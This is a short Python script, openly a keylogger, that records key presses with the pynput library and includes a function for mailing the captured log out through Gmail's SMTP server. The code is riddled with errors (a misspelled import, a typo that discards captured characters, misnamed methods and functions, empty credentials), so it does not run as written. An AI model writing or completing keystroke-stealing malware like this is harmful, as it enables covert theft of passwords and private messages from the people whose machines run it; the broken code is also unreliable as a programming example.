import pynput.keyboard
import smtplit


log = ""

def callback_function(key):
    global log
    try:
        logo = log + key.char.encode("utf-8")
        
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
             log = log + str(key)
       
      
def send_email():
   email_server = smtplib.SMTP("smtp.gmail.com",587)
   email_server.startts()
   email_server.login("")
   email_server.sendmail("","")
   email_server.quit("","") 
    
send_email()
keylogger_listener = pynput.keyboard.Listener(on_press=callback_funcation)
with keylogger_listener:
    keylogger_listener.join()
